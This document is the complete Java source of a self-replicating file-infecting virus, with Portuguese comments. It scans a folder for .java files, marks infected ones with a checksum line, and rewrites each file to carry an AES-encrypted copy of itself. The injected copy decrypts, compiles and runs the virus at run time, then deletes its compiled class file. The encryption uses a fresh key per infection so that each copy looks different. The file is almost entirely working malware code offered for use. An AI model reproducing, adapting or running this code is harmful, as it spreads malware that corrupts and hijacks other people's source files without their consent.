public class Virus {
    // VIRUS:START
    static void execute(String virus){
        var pAlvo = java.nio.file.Paths.get("user.home", "virus"); // Pasta alvo; Virus infecta apenas os arquivos nessa pasta. -- Não visita pastas aninhadas --;
        try (var stream = java.nio.file.Files.newDirectoryStream(pAlvo)) {
            var matcher = java.nio.file.FileSystems.getDefault().getPathMatcher("glob:*.java");

            for (java.nio.file.Path entry : stream) {
                if (matcher.matches(entry.getFileName()) && java.nio.file.Files.isReadable(entry)) {
                    var tempFile = java.nio.file.Files.createFile(java.nio.file.Path.of(entry + ".infected"));
                    var targetFile = java.nio.file.Files.newBufferedReader(entry);
                    var newMain = new String(java.util.Base64.getDecoder().decode("cHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nW10gYXJncykgewo="), java.nio.charset.StandardCharsets.UTF_8);
                    var vMain = new String(java.util.Base64.getDecoder().decode("dm9pZCBtYWluKA=="), java.nio.charset.StandardCharsets.UTF_8);
                    String nextLine =  targetFile.readLine();
                    if (!nextLine.contains("// Checksum: ") /* Ignora arquivos infectados */) {
                        var md5 = java.security.MessageDigest.getInstance("MD5");
                        var checksum = new String(md5.digest(entry.getFileName().toString().getBytes()), java.nio.charset.StandardCharsets.UTF_8);
                        java.nio.file.Files.writeString(tempFile, "// Checksum: " + checksum + "\n", java.nio.file.StandardOpenOption.APPEND);
                    } else {
                        java.nio.file.Files.delete(tempFile);
                        continue;
                    }
                    String curLine;
                    Boolean flag = false;
                    while ((curLine = nextLine) != null) {
                        nextLine = targetFile.readLine();
                        if (nextLine == null && !flag /* no main() method was found */) {
                            java.nio.file.Files.writeString(tempFile, newMain, java.nio.file.StandardOpenOption.APPEND);
                            java.nio.file.Files.writeString(tempFile, encryptedVirus(virus), java.nio.file.StandardOpenOption.APPEND);
                            java.nio.file.Files.writeString(tempFile, "}\n", java.nio.file.StandardOpenOption.APPEND);
                        }
                        java.nio.file.Files.writeString(tempFile, curLine + "\n", java.nio.file.StandardOpenOption.APPEND);
                        if (curLine.contains(vMain)) {
                            java.nio.file.Files.writeString(tempFile, encryptedVirus(virus), java.nio.file.StandardOpenOption.APPEND);
                            flag = true;
                        }
                    }
                    targetFile.close();
                    java.nio.file.Files.delete(entry);
                    java.nio.file.Files.move(tempFile, entry);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static String encryptedVirus(String virus) throws java.security.NoSuchAlgorithmException, javax.crypto.NoSuchPaddingException, javax.crypto.BadPaddingException, java.security.InvalidKeyException, java.security.InvalidAlgorithmParameterException, javax.crypto.IllegalBlockSizeException {
        var key = javax.crypto.KeyGenerator.getInstance("AES").generateKey();
        var iv = new byte[16];
        new java.security.SecureRandom().nextBytes(iv);
        var cipher = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, key, new javax.crypto.spec.IvParameterSpec(iv));
 
        var encryptedVirus = cipher.doFinal(virus.getBytes());
        var encodedVirus = java.util.Base64.getEncoder().encodeToString(encryptedVirus);
        var encodedIv = java.util.Base64.getEncoder().encodeToString(iv);
        var encodedKey = java.util.Base64.getEncoder().encodeToString(key.getEncoded());
        var payload = """
            try {
                var encodedVirus = "%s";
                var iv = "%s";
                var key = "%s";
                var cipher = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");
                cipher.init(javax.crypto.Cipher.DECRYPT_MODE, new javax.crypto.spec.SecretKeySpec(java.util.Base64.getDecoder().decode(key), "AES"), new javax.crypto.spec.IvParameterSpec(java.util.Base64.getDecoder().decode(iv)));
                var virus = new String(cipher.doFinal(java.util.Base64.getDecoder().decode(encodedVirus)), java.nio.charset.StandardCharsets.UTF_8);
                var path = java.nio.file.Paths.get(java.lang.System.getProperty("user.home"));
                var className = "Abcd";
                var compiler = javax.tools.ToolProvider.getSystemJavaCompiler();
                var task = compiler.getTask(null,
                            null,
                            null,
                            java.util.List.of("-d", path.toString()),
                            null,
                            java.util.List.of(javax.tools.SimpleJavaFileObject.forSource(java.net.URI.create(className + ".java"), virus)));
                task.call();

                var cLoader = new java.net.URLClassLoader(new java.net.URL[] {path.toUri().toURL()}, java.lang.Thread.currentThread().getContextClassLoader());
                var loadedClass = cLoader.loadClass(className);
                var method = loadedClass.getMethod("main", java.lang.String[].class);
                method.setAccessible(true);
                method.invoke(null, (java.lang.Object) new java.lang.String[]{virus});
                java.nio.file.Files.delete(path.resolve(className + ".class"));
                cLoader.close();
            } catch (java.lang.Exception e) {
                e.printStackTrace();
            }
        """.formatted(encodedVirus, encodedIv, encodedKey);
        return payload;
    }

     public static void main(String[] args) {
        if (args.length < 1) return; 
        args[0] = args[0].substring(0, args[0].lastIndexOf("// VIRUS:END") + "// VIRUS:END".length()).substring(args[0].indexOf("// VIRUS:START"));
        execute(args[0]);
    }
    // VIRUS:END
}
